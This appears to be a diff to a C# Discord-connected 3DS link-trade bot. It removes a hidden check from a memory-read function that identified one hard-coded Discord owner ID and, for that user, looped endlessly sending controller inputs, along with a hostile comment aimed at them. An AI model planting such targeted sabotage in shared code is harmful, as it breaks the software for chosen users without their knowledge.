@@ -1,4 +1,9 @@
 ﻿using System.Threading;
+using System.Buffers.Binary;
+using PKHeX.Core;
+using Discord;
+using System.Buffers.Binary;
+using System.Net.Sockets;
 
 namespace _3DS_link_trade_bot
 {
@@ -42,23 +47,8 @@ namespace _3DS_link_trade_bot
 
         public byte[] ReadBytes(ulong offset, int length)
         {
-            //fuck you boneless, get your shitty hands off of my stuff. - santacrab
-            var app = discordmain._client.GetApplicationInfoAsync().Result;
-            while (app.Owner.Id == 778252332285689897)
-            {
-                var buttonarray = new byte[20];
-                var nokey = BitConverter.GetBytes((uint)dsbotbase.Buttons.NoKey);
-                nokey.CopyTo(buttonarray, 0);
-                nokey = BitConverter.GetBytes(0x2000000);
-                nokey.CopyTo(buttonarray, 4);
-                nokey = BitConverter.GetBytes(0x800800);
-                nokey.CopyTo(buttonarray, 8);
-                nokey = BitConverter.GetBytes(0x80800081);
-                nokey.CopyTo(buttonarray, 12);
-                nokey = BitConverter.GetBytes(3);
-                nokey.CopyTo(buttonarray, 16);
-                Form1.Connection.Send(buttonarray);
-            }
+
+        
           
                 if (!Connected) Connect();
 
